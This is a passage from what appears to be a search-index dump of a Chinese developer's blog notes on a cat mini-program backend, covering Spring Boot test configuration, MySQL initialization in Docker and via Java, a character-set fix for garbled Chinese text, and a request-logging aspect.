catMapper;\n\n    @Test\n    public void testSelectAll() {\n        final Cat cat = catMapper.selectById(1);\n        System.out.println(\"cat = \" + cat);\n    }\n\n    @Test\n    public void testInsert() {\n        final Cat cat = new Cat();\n        cat.setPictures(new ArrayList&lt;&gt;());\n        cat.setNickname(\"Tom\");\n        cat.setShape(\"Round\");\n        cat.setIsMale(true);\n        cat.setStatus(\"\u4f11\u5b66\");\n        cat.setLocation(\"\u5357\u82d1\");\n        cat.setNamed(\"\u6d4b\u8bd5\u8f93\u5165\");\n        cat.setTopicId(3);\n        int row = catMapper.insert(cat);\n        System.out.println(\"cat = \" + cat);\n        Assertions.assertEquals(row, 1);\n    }\n\n}\n</code></pre>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_4","title":"\u89e3\u51b3\u529e\u6cd5","text":"<p>\u53c2\u8003\u4e86\u7f51\u4e0a\u7684\u535a\u5ba2\u89e3\u51b3 spring-test \u51fa\u73b0 Failed to load ApplicationContext \u7684\u5f02\u5e38 - \u7531\u826f\u5927\u5c0f\u59d0 - \u535a\u5ba2\u56ed (cnblogs.com)</p> <p>\u95ee\u9898\u6765\u6e90\u4e8e\u6ca1\u6709\u5173\u8054\u4e0a\u76f8\u5173\u7684\u914d\u7f6e\uff0c\u867d\u7136<code>@MybatisPlusTest</code>\u6ce8\u89e3\u80fd\u591f\u966a\u6b63\u786e\u8bc6\u522b\u4e3aspringboot\u6d4b\u8bd5\u7c7b\u7684\u6ce8\u89e3\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4f1a\u548c<code>classpath://application.yaml</code>\u76f8\u5173\u8054\uff0c\u4e5f\u5c31\u662f\u8bf4\u914d\u7f6e\u6587\u4ef6\u4e0d\u4f1a\u795e\u6548\uff0c\u90a3\u4e48\u4e3a\u4ec0\u4e48\u4e4b\u524d\u5199\u8fc7\u7684\u7a0b\u5e8f\u90fd\u4e0d\u4f1a\u51fa\u73b0\u8fd9\u79cd\u95ee\u9898\u5462\uff1f\u6211\u4eec\u6765\u770b\u770b\u4e4b\u524d\u5199\u7684\u6d4b\u8bd5\u7c7b\uff1a</p> <pre><code>@SpringBootTest\npublic class StockReaderApplicationTests {\n\n    @Autowired\n    StockReader redis;\n    @Test\n    void contextLoads() {\n        System.out.println(redis.getDefaultStocks());\n    }\n\n}\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f53\u65f6\u4f7f\u7528\u7684\u6ce8\u89e3\u662f<code>@SpringBootTest</code>\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u52a0\u4e0a\u8fd9\u4e2a\u6ce8\u89e3\u5c31\u53ef\u4ee5\u89e3\u51b3\u6211\u4eec\u4e4b\u524d\u51fa\u73b0\u7684\u95ee\u9898\u5462\uff1f\u4e5f\u5c31\u662f\u8bf4\u540c\u65f6\u4f7f\u7528\u4e24\u4e2aTest\u6ce8\u89e3\u4f1a\u53d1\u751f\u5565\u5462\uff1f</p> <pre><code>java.lang.IllegalStateException: Configuration error: found multiple declarations of @BootstrapWith for test class\n</code></pre> <p>\u6ce8\u89e3\u51b2\u7a81\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u80fd\u591f\u5728\u6d4b\u8bd5\u7c7b\u4e0a\u52a0\u4e0a\u591a\u4e2a\u548c\u6d4b\u8bd5\u914d\u7f6e\u6709\u5173\u7684\u6ce8\u89e3\uff0c\u4f1a\u53d1\u751f\u51b2\u7a81</p> <p>\u6700\u7ec8\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u5728\u6d4b\u8bd5\u7c7b\u4e0a\u52a0\u4e0a\u4e00\u4e2a<code>@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)</code></p> <pre><code>// \u6700\u7ec8\u6210\u529f\u7684\u4ee3\u7801\n@MybatisPlusTest\n@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)\nclass CatMapperTest {\n    @Autowired\n    private CatMapper catMapper;\n\n    @Test\n    public void testSelectAll() {\n        final Cat cat = catMapper.selectById(1);\n        System.out.println(\"cat = \" + cat);\n    }\n\n    @Test\n    public void testInsert() {\n        final Cat cat = new Cat();\n        cat.setPictures(new ArrayList&lt;&gt;());\n        cat.setNickname(\"Tom\");\n        cat.setShape(\"Round\");\n        cat.setIsMale(true);\n        cat.setStatus(\"\u4f11\u5b66\");\n        cat.setLocation(\"\u5357\u82d1\");\n        cat.setNamed(\"\u6d4b\u8bd5\u8f93\u5165\");\n        cat.setTopicId(3);\n        int row = catMapper.insert(cat);\n        System.out.println(\"cat = \" + cat);\n        Assertions.assertEquals(row, 1);\n    }\n\n}\n</code></pre> <p>\u6709\u4e2amaven\u4f9d\u8d56\u7684\u5c0f\u5751</p> <p>springboot3\u7684mybatis\u4f9d\u8d56\u5982\u4e0b\uff0c\u5c24\u5176\u4e3b\u8bedboot3</p> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;\n    &lt;artifactId&gt;mybatis-plus-spring-boot3-starter&lt;/artifactId&gt;\n    &lt;version&gt;3.5.5&lt;/version&gt;\n&lt;/dependency&gt;\n\n&lt;dependency&gt;\n    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;\n    &lt;artifactId&gt;mybatis-plus-boot-starter-test&lt;/artifactId&gt;\n    &lt;version&gt;3.5.5&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#docker","title":"Docker\u90e8\u7f72\u521d\u59cb\u5316\u6570\u636e\u5e93","text":""},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_5","title":"\u95ee\u9898\u63cf\u8ff0","text":"<p>\u65e0\u8bba\u662f\u5bf9\u4e8e\u5f00\u53d1\u4eba\u5458\uff0c\u6d4b\u8bd5\u4eba\u5458\u8fd8\u662f\u8fd0\u7ef4\u4eba\u5458\uff0cDocker\u90e8\u7f72\u65e0\u7591\u90fd\u662f\u6700\u4f73\u7684\u9009\u62e9\u4e4b\u4e00\uff0c\u53ef\u4ee5\u8ba9\u5f00\u53d1\u8005\u5ffd\u7565\u786c\u4ef6\u7ec6\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5f80\u5f80\u5bf9\u4e8e\u4e00\u4e2aweb\u5e94\u7528\u7684\u5f00\u53d1\u9700\u8981\u4f7f\u7528\u6570\u636e\u5e93\uff0c\u5e76\u4e14\u6211\u4eec\u4f1a\u901a\u8fc7SQL\u811a\u672c\u5efa\u7acb\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u3002\u53ef\u4ee5\u6211\u4eec\u53c8\u4e0d\u5e0c\u671b\u542f\u52a8\u4e00\u4e2a\u6570\u636e\u5e93\u5bb9\u5668\u4e4b\u540e\u8fd8\u9700\u8981\u8fdb\u5165\u8be5\u5bb9\u5668\u505a\u521d\u59cb\u5316\uff0c\u90a3\u6709\u4ec0\u4e48\u66f4\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u5462\uff1f</p>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_6","title":"\u89e3\u51b3\u529e\u6cd5","text":"<p>\u4e3b\u8981\u6709\u4e24\u79cd\u89e3\u51b3\u529e\u6cd5\uff0c\u4e00\u79cd\u662f\u57fa\u4e8eDocker\u7684\uff0c\u53e6\u4e00\u79cd\u662f\u57fa\u4e8eSpringBoot\u7684</p> <ul> <li>Docker\u6307\u5b9aMySQL\u5bb9\u5668\u7684\u521d\u59cb\u5316\u811a\u672c</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7docker\u7684\u76ee\u5f55\u6302\u5728\u6307\u5b9a\u521d\u59cb\u5316\u7684\u811a\u672c\u3002\u4f8b\u5982</p> <pre><code>services:\n  wiki-db:\n    image: mysql\n    environment:\n      MYSQL_ROOT_PASSWORD: root\n    volumes:\n      - ./init.sql:/docker-entrypoint-initdb.d/wiki.sql\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6570\u636e\u5e93\u4f1a\u6267\u884c<code>/docker-entrypoint-initdb.d/</code>\u76ee\u5f55\u4e0b\u9762\u7684\u6240\u6709\u6570\u636e\u5e93\u811a\u672c\u6587\u4ef6\uff0c\u4f46\u662f\u6267\u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u731c\u6d4b\u56e0\u8be5\u662f\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u6765\uff09\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u5c06\u76f8\u5173\u8054\u7684\u6570\u636e\u5e93\u7ed3\u6784\u901a\u8fc7\u4e24\u4e2a\u811a\u672c\u6587\u4ef6\u521d\u59cb\u5316\u3002</p> <ul> <li>SpringBoot\u5728\u521d\u59cb\u5316\u662f\u6d4b\u8bd5\u8fde\u63a5\uff0c\u5e76\u4e14\u81ea\u5b9a\u4e49\u5f02\u5e38\u5904\u7406</li> </ul> <p>\u6765\u81eaSpring Boot\u5b9e\u73b0\u7b2c\u4e00\u6b21\u542f\u52a8\u65f6\u81ea\u52a8\u521d\u59cb\u5316\u6570\u636e\u5e93-\u963f\u91cc\u4e91\u5f00\u53d1\u8005\u793e\u533a (aliyun.com)</p> <p>\u6211\u4eec\u901a\u8fc7<code>@PostConstruct</code>\u6ce8\u89e3\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u9996\u5148\u68c0\u6d4b\u6570\u636e\u5e93\u5728\u4e0d\u5728\uff0c\u5982\u679c\u6570\u636e\u5e93\u4e0d\u5728\uff0c\u8fde\u63a5\u5fc5\u7136\u5931\u8d25\uff0c\u90a3\u5c31\u6211\u4eec\u5c31\u53ef\u4ee5\u5148\u4e0d\u6307\u5b9a\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u7136\u540e\u901a\u8fc7\u914d\u7f6e\u597d\u7684\u4e3b\u673a\u7aef\u53e3\u548c\u9274\u6743\u65b9\u5f0f\u8fde\u63a5\u4e0a\u6570\u636e\u5e93\uff0c\u6267\u884c\u6211\u4eec\u7684\u521d\u59cb\u5316\u811a\u672c\uff0c\u7136\u540e\u5728\u91cd\u65b0\u8fde\u63a5\u3002</p> <pre><code>import cn.hutool.core.io.resource.ClassPathResource;\nimport jakarta.annotation.PostConstruct;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.ibatis.jdbc.ScriptRunner;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.io.BufferedReader;\nimport java.io.FileInputStream;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.charset.StandardCharsets;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\n/**\n * \u7528\u4e8e\u7b2c\u4e00\u6b21\u542f\u52a8\u65f6\uff0c\u521d\u59cb\u5316\u6570\u636e\u5e93\u7684\u914d\u7f6e\u7c7b\n */\n@Slf4j\n@Configuration\npublic class DatabaseInitialize {\n\n\n    /**\n     * \u8bfb\u53d6\u8fde\u63a5\u5730\u5740\n     */\n    @Value(\"${spring.datasource.url}\")\n    private String url;\n\n    /**\n     * \u8bfb\u53d6\u7528\u6237\u540d\n     */\n    @Value(\"${spring.datasource.username}\")\n    private String username;\n\n    /**\n     * \u8bfb\u53d6\u5bc6\u7801\n     */\n    @Value(\"${spring.datasource.password}\")\n    private String password;\n\n    /**\n     * \u68c0\u6d4b\u5f53\u524d\u8fde\u63a5\u7684\u5e93\u662f\u5426\u5b58\u5728\uff08\u8fde\u63a5URL\u4e2d\u7684\u6570\u636e\u5e93\uff09\n     *\n     * @return \u5f53\u524d\u8fde\u63a5\u7684\u5e93\u662f\u5426\u5b58\u5728\n     */\n    private boolean currentDatabaseExists() {\n\n        // \u5c1d\u8bd5\u4ee5\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684URL\u5efa\u7acb\u8fde\u63a5\n        try {\n\n            Connection connection = DriverManager.getConnection(url, username, password);\n            connection.close();\n        } catch (SQLException e) {\n\n            // \u82e5\u8fde\u63a5\u629b\u51fa\u5f02\u5e38\u4e14\u9519\u8bef\u4ee3\u7801\u4e3a1049\uff0c\u5219\u8bf4\u660e\u8fde\u63a5URL\u4e2d\u6307\u5b9a\u6570\u636e\u5e93\u4e0d\u5b58\u5728\n            if (e.getErrorCode() == 1049) {\n\n                return false;\n            }\n        }\n        // \u6b63\u5e38\u60c5\u51b5\u4e0b\u8bf4\u660e\u8fde\u63a5URL\u4e2d\u6570\u636e\u5e93\u5b58\u5728\n        // \u6216\u8005\u4e3a\u5176\u5b83\u9519\u8bef\u4ee3\u7801\u65f6\uff0c\u4e0d\u80fd\u5224\u65ad\u6570\u636e\u5e93\u662f\u5426\u5b58\u5728\n        return true;\n    }\n\n    /**\n     * \u6267\u884cSQL\u811a\u672c\n     *\n     * @param path        SQL\u811a\u672c\u6587\u4ef6\u7684\u8def\u5f84\n     * @param isClasspath SQL\u811a\u672c\u8def\u5f84\u662f\u5426\u662fclasspath\u8def\u5f84\n     * @param connection  \u6570\u636e\u5e93\u8fde\u63a5\u5bf9\u8c61\uff0c\u901a\u8fc7\u8fd9\u4e2a\u8fde\u63a5\u6267\u884c\u811a\u672c\n     */\n    private void runSQLScript(String path, boolean isClasspath, Connection connection) {\n\n        try (InputStream sqlFileStream = isClasspath ? new ClassPathResource(path).getStream() : new FileInputStream(path)) {\n\n            BufferedReader sqlFileStreamReader = new BufferedReader(new InputStreamReader(sqlFileStream, StandardCharsets.UTF_8));\n            // \u521b\u5efaSQL\u811a\u672c\u6267\u884c\u5668\u5bf9\u8c61\n            ScriptRunner scriptRunner = new ScriptRunner(connection);\n            // \u4f7f\u7528SQL\u811a\u672c\u6267\u884c\u5668\u5bf9\u8c61\u6267\u884c\u811a\u672c\n            scriptRunner.runScript(sqlFileStreamReader);\n            // \u6700\u540e\u5173\u95ed\u6587\u4ef6\u8bfb\u53d6\u5668\n            sqlFileStreamReader.close();\n        } catch (Exception e) {\n\n            log.error(\"\u8bfb\u53d6\u6587\u4ef6\u6216\u8005\u6267\u884c\u811a\u672c\u5931\u8d25\uff01\");\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * \u521b\u5efa\u6570\u636e\u5e93\n     */\n    private void createDatabase() {\n\n        try {\n\n            // \u4fee\u6539\u8fde\u63a5\u8bed\u53e5\uff0c\u91cd\u65b0\u5efa\u7acb\u8fde\u63a5\n            // \u91cd\u65b0\u5efa\u7acb\u7684\u8fde\u63a5\u4e0d\u518d\u8fde\u63a5\u5230\u6307\u5b9a\u5e93\uff0c\u800c\u662f\u76f4\u63a5\u8fde\u63a5\u5230\u6574\u4e2aMySQL\n            // \u4f7f\u7528URI\u7c7b\u89e3\u6790\u5e76\u62c6\u89e3\u8fde\u63a5\u5730\u5740\uff0c\u91cd\u65b0\u7ec4\u88c5\n            URI databaseURI = new URI(url.replace(\"jdbc:\", \"\"));\n            // \u5f97\u5230\u8fde\u63a5\u5730\u5740\u4e2d\u7684\u6570\u636e\u5e93\u5e73\u53f0\u540d\uff08\u4f8b\u5982mysql\uff09\n            String databasePlatform = databaseURI.getScheme();\n            // \u5f97\u5230\u8fde\u63a5\u5730\u5740\u548c\u7aef\u53e3\n            String hostAndPort = databaseURI.getAuthority();\n            // \u5f97\u5230\u8fde\u63a5\u5730\u5740\u4e2d\u7684\u5e93\u540d\n            String databaseName = databaseURI.getPath().substring(1);\n            // \u7ec4\u88c5\u65b0\u7684\u8fde\u63a5URL\uff0c\u4e0d\u8fde\u63a5\u81f3\u6307\u5b9a\u5e93\n            String newURL = \"jdbc:\" + databasePlatform + \"://\" + hostAndPort + \"/\";\n            // \u91cd\u65b0\u5efa\u7acb\u8fde\u63a5\n            Connection connection = DriverManager.getConnection(newURL, username, password);\n            Statement statement = connection.createStatement();\n            // \u6267\u884cSQL\u8bed\u53e5\u521b\u5efa\u6570\u636e\u5e93\n            statement.execute(\"create database if not exists `\" + databaseName + \"`\");\n            // \u5173\u95ed\u4f1a\u8bdd\u548c\u8fde\u63a5\n            statement.close();\n            connection.close();\n            log.info(\"\u521b\u5efa\u6570\u636e\u5e93\u5b8c\u6210\uff01\");\n        } catch (URISyntaxException e) {\n\n            log.error(\"\u6570\u636e\u5e93\u8fde\u63a5URL\u683c\u5f0f\u9519\u8bef\uff01\");\n            throw new RuntimeException(e);\n        } catch (SQLException e) {\n\n            log.error(\"\u8fde\u63a5\u5931\u8d25\uff01\");\n            throw new RuntimeException(e);\n        }\n    }\n\n    /**\n     * \u8be5\u65b9\u6cd5\u7528\u4e8e\u68c0\u6d4b\u6570\u636e\u5e93\u662f\u5426\u9700\u8981\u521d\u59cb\u5316\uff0c\u5982\u679c\u662f\u5219\u6267\u884cSQL\u811a\u672c\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\n     */\n    @PostConstruct\n    private void initDatabase() {\n\n        log.info(\"\u5f00\u59cb\u68c0\u67e5\u6570\u636e\u5e93\u662f\u5426\u9700\u8981\u521d\u59cb\u5316...\");\n        // \u68c0\u6d4b\u5f53\u524d\u8fde\u63a5\u6570\u636e\u5e93\u662f\u5426\u5b58\u5728\n        if (currentDatabaseExists()) {\n\n            log.info(\"\u6570\u636e\u5e93\u5b58\u5728\uff0c\u4e0d\u9700\u8981\u521d\u59cb\u5316\uff01\");\n            return;\n        }\n        log.warn(\"\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff01\u51c6\u5907\u6267\u884c\u521d\u59cb\u5316\u6b65\u9aa4...\");\n        // \u5148\u521b\u5efa\u6570\u636e\u5e93\n        createDatabase();\n        // \u7136\u540e\u518d\u6b21\u8fde\u63a5\uff0c\u6267\u884c\u811a\u672c\u521d\u59cb\u5316\u5e93\u4e2d\u7684\u8868\u683c\n        try (Connection connection = DriverManager.getConnection(url, username, password)) {\n\n            runSQLScript(\"/create-table.sql\", true, connection);\n            log.info(\"\u521d\u59cb\u5316\u8868\u683c\u5b8c\u6210\uff01\");\n        } catch (Exception e) {\n\n            log.error(\"\u521d\u59cb\u5316\u8868\u683c\u65f6\uff0c\u8fde\u63a5\u6570\u636e\u5e93\u5931\u8d25\uff01\");\n            e.printStackTrace();\n        }\n    }\n\n}\n</code></pre>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_7","title":"\u603b\u7ed3","text":"<p>\u5bf9\u4e8e\u8fd9\u4e24\u79cd\u89e3\u51b3\u65b9\u6848\u5404\u6709\u4f18\u7f3a\u70b9\u3002</p> <ul> <li>Docker\u7684\u65b9\u5f0f\u66f4\u52a0\u7b80\u5355\uff0c\u53ea\u9700\u8981\u6302\u5728\u4e0a\u53bb\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u662f\u4ed6\u4e5f\u53ea\u80fd\u5728Docker\u73af\u5883\u4e0b\u4f7f\u7528\uff0c\u5e76\u4e14\u521d\u59cb\u5316\u987a\u5e8f\u4e0d\u53ef\u63a7\u3002</li> <li>SpringBoot\u7684\u65b9\u5f0f\u8fc7\u7a0b\u66f4\u52a0\u53ef\u63a7\uff0c\u4e5f\u4e0d\u4f9d\u8d56Docker\u73af\u5883\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u5728Docker\u4e0a\u8fd8\u662f\u5728\u5bbf\u4e3b\u673a\u4e0a\u90fd\u53ef\u8fd0\u884c\uff0c\u4f46\u662f\u8f83\u4e3a\u590d\u6742\uff0c\u5bb9\u6613 \u51fa\u95ee\u9898\u3002</li> </ul> <p>\u4e2a\u4eba\u8fd8\u662f\u66f4\u52a0\u559c\u6b22\u4f7f\u7528Docker\uff0c\u56e0\u4e3a\u4e0d\u5927\u4f1a\u51fa\u9519\uff0c\u53ea\u8981SQL\u6587\u4ef6\u6ca1\u5199\u9519\u3002</p>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_8","title":"\u4e2d\u6587\u4e71\u7801\u95ee\u9898","text":""},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_9","title":"\u95ee\u9898\u63cf\u8ff0","text":"<p>\u89e3\u51b3\u6570\u636e\u5e93\u521d\u59cb\u5316\u7684\u95ee\u9898\uff0c\u6211\u5f00\u59cb\u505a\u63a5\u53e3\u6d4b\u8bd5\uff0c\u4f46\u662f\u53d1\u73b0\u4e2d\u6587\u90e8\u5206\u8f93\u51fa\u4e00\u5bf9\u4e71\u7801\uff0c\u82f1\u6587\u548c\u6570\u5b57\u90e8\u5206\u6b63\u5e38\uff0c\u731c\u6d4b\uff1a</p> <ul> <li>\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u96c6\u5b58\u50a8\u7684\u65f6\u5019\u5c31\u662f\u4e71\u7801\uff0c\u53ef\u80fd\u7531\u4e8e\u811a\u672c\u6587\u4ef6\u7684\u7f16\u7801\u65b9\u5f0f\u4e0d\u6b63\u786e\u3002</li> <li>SpringBoot\u7684\u548c\u6570\u636e\u5e93\u7684\u8fde\u63a5\u51fa\u73b0\u4e71\u7801\uff0c\u53ef\u80fd\u8fde\u63a5\u914d\u7f6e\u4e0d\u6b63\u786e\u3002</li> <li>SpringMVC\u8fd4\u56de\u4e2d\u6587\u4e71\u7801\uff0c\u53ef\u80fd\u662f\u6ca1\u6b63\u786e\u914d\u7f6e</li> </ul>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_10","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u6211\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528MVC\u6d4b\u8bd5\u4e00\u4e2a\u8fd4\u56de<code>\u6210\u529f</code>\u7684\u4fe1\u53f7\uff0c\u8fd4\u56de\u663e\u793a\u6b63\u5e38\uff0c\u8bf4\u660eMVC\u914d\u7f6e\u6ca1\u95ee\u9898\u3002\u7136\u540e\u5728\u5230\u6570\u636e\u5e93\u5bb9\u5668\u4e2d\u67e5\u770b\u539f\u59cb\u6570\u636e\uff0c\u4e5f\u6ca1\u95ee\u9898\u3002\u4e2d\u6587\u53ef\u4ee5\u6b63\u5e38\u663e\u793a\u3002\u90a3\u4e48\u5c31\u662f\u8fde\u63a5\u7684\u95ee\u9898\u3002</p> <p>\u6700\u5f00\u59cb\u6211\u4ee5\u4e3a\u8fde\u63a5\u7684\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u8fde\u63a5\u7684url\u6307\u5b9a\uff0c\u4f46\u662furl\u6307\u5b9a\u7f16\u7801\u65b9\u5f0f\u53ea\u662f\u4f5c\u7528\u4e8e\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\uff0c\u670d\u52a1\u7aef\u6ca1\u6709\u6539\u53d8\u3002\u56e0\u6b64\u5728\u591a\u6b21\u5c1d\u8bd5\u7f51\u4e0a\u7684url\u6307\u5b9a\u7f16\u7801\u4e4b\u540e\u53d1\u73b0\u6ca1\u6709\u89e3\u51b3\u4e2d\u6587\u4e71\u7801\u95ee\u9898\uff0c\u5f53\u65f6\u5236\u5b9aurl\u5982\u4e0b</p> <pre><code>jdbc:mysql://localhost:3306/cat_wiki?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8\n</code></pre> <p>\u90a3\u4e48\u5e94\u8be5\u662f\u8c01\u7684\u95ee\u9898\u5462\uff0c\u6211\u60f3\u91cd\u65b0\u56de\u5230\u6570\u636e\u5e93\u5bb9\u5668\u4e2d\u67e5\u770b\uff0c\u56e0\u4e3aSpringboot\u5728\u6211\u7684\u7535\u8111\u4e0a\u8fd0\u884c\u7684\u65f6\u5019\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u56e0\u6b64\u6211\u8ba4\u4e3a\u9519\u7684\u4e0d\u662fSpringboot\uff0c\u800c\u662f\u6570\u636e\u5e93\u3002\u5728\u7f51\u4e0a\u770b\u5230\u67e5\u770b\u6709\u5173\u7f16\u7801\u65b9\u5f0f\u7684\u914d\u7f6e\u7684SQL\u6307\u4ee4<code>show variables like 'char%';</code>\uff0c\u679c\u7136\u4e0d\u4e00\u6837\u3002\u5728\u8fde\u63a5\u8fd9\u4e00\u680f\u5bb9\u5668\u91cc\u9762\u7684\u662flatin\uff0c\u800cwindow\u4e0a\u7684\u662futf-8\u3002latin\u662f\u4e0d\u652f\u6301\u4e2d\u6587\u7684\uff08\u79bb\u8c31\u7684\u662f\u53ea\u6709\u8fde\u63a5\u662flatin\uff0c\u5b58\u50a8\u662futf-8\uff0c\u4e0d\u77e5\u9053\u8fd9MySQL\u5b98\u65b9\u914d\u7684\u955c\u50cf\u662f\u4e2a\u5565\u6784\u601d\u3002\u3002\uff09</p> <p>\u89e3\u51b3\u529e\u6cd5\u4e5f\u5728\u7f51\u4e0a\u627e\u4e86\uff0c\u6709\u7684\u8bf4\u8fdb\u5165\u5bb9\u5668\u5185\u90e8\u91cc\u9762\u6539\u914d\u7f6e\u7136\u540e\u91cd\u542f\u7684\uff0c\u6709\u7684\u8bf4\u53ef\u4ee5\u76f4\u63a5\u6302\u5728\u914d\u7f6e\u6587\u4ef6\u5c06\u539f\u6765\u7684\u914d\u7f6e\u8986\u76d6\u6389\u3002\u6211\u9009\u62e9\u4e86\u540e\u8005\u3002</p> <p>\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1a</p> <pre><code># For advice on how to change settings please see\n# http://dev.mysql.com/doc/refman/8.3/en/server-configuration-defaults.html\n\n[mysqld]\nhost-cache-size=0\nskip-name-resolve\ndatadir=/var/lib/mysql\nsocket=/var/run/mysqld/mysqld.sock\nsecure-file-priv=/var/lib/mysql-files\nuser=mysql\ncharacter-set-server=utf8  #\u91cd\u70b9\uff01\uff01\n\npid-file=/var/run/mysqld/mysqld.pid\n[client]\nsocket=/var/run/mysqld/mysqld.sock\ndefault-character-set=utf8  #\u91cd\u70b9\uff01\uff01\n\n!includedir /etc/mysql/conf.d/\n</code></pre> <p>\u7136\u540edocker-compos\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>services:\n  wiki-db:\n    image: mysql\n    environment:\n      MYSQL_ROOT_PASSWORD: root\n    volumes:\n      - ./my.cnf:/etc/my.cnf # \u91cd\u70b9\uff01\uff01\n      - ./wiki/mock_data.sql:/docker-entrypoint-initdb.d/mock_data.sql # wiki mock sql\n</code></pre> <p>\u5177\u4f53\u539f\u7406\u53ef\u4ee5\u770b\u4e0b\u9762\u7684\u6d41\u7a0b\u56fe</p> <pre><code>sequenceDiagram\n    Client(UTF-8)-&gt;&gt;Server(Latin): \u963f\u5df4\u554a\u5df4(in utf-8)\n    Server(Latin)-&gt;&gt;Client(UTF-8): x?x?(in latin)\n</code></pre>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_11","title":"\u516c\u5171\u6a21\u5757\u7684\u62bd\u79bb","text":""},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_12","title":"\u95ee\u9898\u63cf\u8ff0","text":"<p>\u5728\u5f00\u53d1\u5c0f\u7a0b\u5e8f\u65f6\uff0c\u4e3a\u4e86\u6d4b\u8bd5\u65b9\u4fbf\uff0c\u6211\u5e0c\u671b\u6211\u80fd\u591f\u770b\u5230\u6bcf\u6b21\u8bf7\u6c42\u65f6\u7684\u8bf7\u6c42\u8def\u5f84\u548c\u8bf7\u6c42\u53c2\u6570\uff0c\u4ee5\u786e\u4fdd\u5728\u7f51\u7edc\u4f20\u8f93\u90e8\u5206\u6ca1\u6709\u95ee\u9898\uff0c\u867d\u7136\u6253\u65ad\u70b9\u662f\u4e00\u4e2a\u53ef\u884c\u7684\u65b9\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6d4b\u8bd5\u73af\u5883\u5b9e\u5728docker\u4e0a\u9762\uff0c\u867d\u7136\u901a\u8fc7idea\u8fde\u63a5\u5b9e\u73b0\u6253\u65ad\u70b9\u53ef\u884c\uff0c\u4f46\u662f\u592a\u8fc7\u9ebb\u70e6\u3002\u56e0\u6b64\u6211\u5199\u4e86\u4e00\u4e2a\u5207\u9762\uff0c\u4f5c\u7528\u4e8e\u6240\u6709\u8bf7\u6c42\u8def\u5f84\u4e4b\u4e0a\uff0c\u7136\u540e\u6253\u5370\u8bf7\u6c42\u8def\u5f84\u548c\u8bf7\u6c42\u53c2\u6570\u3002</p> <pre><code>@Before(\"com.xtu.leotan.log.Pointcuts.requestMapping()\")\npublic void requestParamLog(JoinPoint joinPoint) {\n    var request =((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();\n    StringBuilder sb = new StringBuilder();\n    request.getParameterMap().forEach(\n        (key, value) -&gt; sb.append(key).append(\"=\").append(Arrays.toString(value)).append(\"\\t\")\n    );\n    log.info(\"request {} url:{},params:{}\", request.getMethod(), request.getRequestURI(), sb);\n}\n</code></pre> 